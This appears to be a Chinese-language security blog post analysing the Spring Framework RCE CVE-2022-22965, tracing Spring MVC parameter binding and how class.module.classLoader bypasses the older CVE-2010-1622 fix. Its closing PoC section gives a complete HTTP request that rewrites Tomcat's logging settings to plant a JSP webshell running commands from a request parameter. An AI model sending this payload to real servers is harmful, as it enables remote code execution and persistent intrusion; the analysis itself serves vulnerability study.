---
title: "Spring Framwork RCE分析"
date: 2022-04-15T10:56:52+08:00
draft: true
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151059216.png
description: 
comments: true
license: false
math: false
categories:
- note
tags:
- Spring
- Java
---

## Spring Framwork RCE分析

最近出的CVE-2022-22965其实是CVE-2010-1622的绕过，大致原理是Spring MVC在参数绑定时，会将用户传入的参数注入到pojo对象中，因为在数据绑定的过程中能获取到classLoader，导致用户可以通过classLoader修改Tomcat的配置属性来执行危险操作

### 影响版本

Spring Framework

- 5.3.0 to 5.3.17
- 5.2.0 to 5.2.19
- 其他一些老旧的不受支持的版本



### Spring MVC 参数绑定流程

我们首先创建一个用户类

```
public class User {
    private String id;
    private String name;
    ......补充其 get set toString 方法
}
```

直接在参数中写上对应 User 类型就可以了

```
@RequestMapping("objectType.do")
@ResponseBody
public String objectType(User user) {
    return user.toString();
}
```

访问`http://localhost:8080/objectType.do?id=001&name=Steven`

返回结果：`User{uid='001', name='Steven'}`

详细可看：[SpringMVC参数绑定入门就这一篇](https://segmentfault.com/a/1190000022586808)

下面是代码层面：

`DispatcherServlet`是 SpringMVC 工作流程的中心，用户请求经过`Filter`和`Interceptor`之后会被`DispatcherServlet`分配到具体的`Controller`，具体是在dodispatch方法里：

![image-20220414175620272](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046343.png)

在doDispatch方法里面，获取处理器适配器再调用后端处理器中的方法：

![image-20220414180105645](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046460.png)

适配器调用后端处理器时候会调用`ModelAttributeMethodProcessor#resolveArgument`来处理请求参数，`resolveArgument`具体是调用`this.bindRequestParameters`：

![image-20220414180227761](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046388.png)

`bindRequestParameters`调用`ServletRequestDataBinder#bind`：

![image-20220414203347627](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046198.png)

下边会走到`DataBinder#doBind`，这里调用`DataBinder#applyPropertyValues`，断点处的`this.getPropertyAccessor()`获得的是一个`BeanWrapperlmpl`对象，接下来就会走到`org.springframework.beans`里面：

![image-20220414175006099](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046172.png)

`BeanWrapperlmpl`继承了`org.springframework.beans.AbstractPropertyAccessor`

`BeanWrapperImpl`具体实现了创建，持有以及修改bean的方法。
其中的`setPropertyValue`方法可以将参数值注入到指定bean的相关属性中(包括list,map等)，同时也可以嵌套设置属性。

这里调用了`setPropertyValues`方法遍历`propertyValue`，并循环调用`setPropertyValue`方法设置属性值：

![image-20220414175129097](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046195.png)



经过剩下的一系列调用，最终会走到`org.springframework.beans.BeanWrapperImpl.BeanPropertyHandler#setValue`

这里先去获取目标bean的setter，再反射调用：

![image-20220414194956957](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046291.png)

这样就实现了Request参数和bean属性的绑定



### 漏洞原理

在上一部分遍历`propertyValue`并循环调用`setPropertyValue`方法设置属性值的时候，在设置之前有一个获得对应的类中参数操作`tokens=xxx`，具体是在`getPropertyAccessorForPropertyPath`里面获取的：

![image-20220414203807497](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151046284.png)

这个方法会递归获取参数值，循环查看参数中是否包含`[`、`]`、`.`若存在则按分割赋值给`nestedProperty`，再调用`getNestedPropertyAccessor`方法：

![image-20220414205520668](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151047675.png)

在`getNestedPropertyAccessor`方法里面会去获取缓存内省的结果`cachedIntrospectionResults`：

![image-20220414211225039](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151047987.png)

这个方法会调用`getBeanInfo`进而调用`java.beans.Introspector#getBeanInfo`去获取Bean的信息：（即Java内省）

![image-20220414213621130](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202204151047880.png)

这里就不得不说内省了：

> 内省(Introspector) 是Java 语言对 JavaBean 类属性、事件的一种缺省处理方法。其中的`propertiesDescriptor`实际上来自于对Method的解析。

意思就是，**只要有 getter/setter 方法中的其中一个，那么 Java 的内省机制就会认为存在一个属性**

Java Beans API的Introspector类提供了两种方法来获取类的bean信息：

```
BeanInfo getBeanInfo(Class<?> beanClass)
BeanInfo getBeanInfo(Class<?> beanClass, Class<?> stopClass)
```

这里就出现了一个使用时可能出现问题的地方：**如何没有传入`stopClass`，这样会使得访问该类的同时访问到`Object.class`**。

因为在java中所有的对象都会默认继承Object基础类而存在一个`getClass()`方法，所以会找到class属性。

如果我们更进一步：`Introspector.getBeanInfo(Class.class)`，那么就可以获取到**classLoader**。

与此相照应的，上图箭头处是CVE-2010-1622的修复，如果获取到`class.classLoader`就直接结束本次循环（不把本次结果存入`this.propertyDescriptors`）

最新的CVE-2022-22965用的是`class.module.classLoader`(jdk9+的Class对象增加了一个Module类的属性)，利用`module.getclassloader != class.classloader`绕过了这个限制。

拿到clasLoader之后和[Struts2 S2-020在Tomcat 8下的命令执行](https://cloud.tencent.com/developer/article/1035297)原理大致相同，也就是可以修改Tomcat的配置，造成任意文件写入。

### PoC

```http
GET /spring4shell/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: localhost:9000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1


```

执行之后可以在`webapps/ROOT/tomcatwar.jsp`看到写入的Webshell。

>  注意：如果使用IDEA运行配置起的Tomcat的话，因为是映射的目录，所以Tomcat下面并不会有webshell，而是在IDEA的某个目录下，可以用everything搜索下

### Reference

https://blog.csdn.net/god_zzZ/article/details/124029497

https://cloud.tencent.com/developer/article/1035297

http://rui0.cn/archives/1158

https://vulhub.org/#/environments/spring/CVE-2022-22965/

https://segmentfault.com/a/1190000022586808
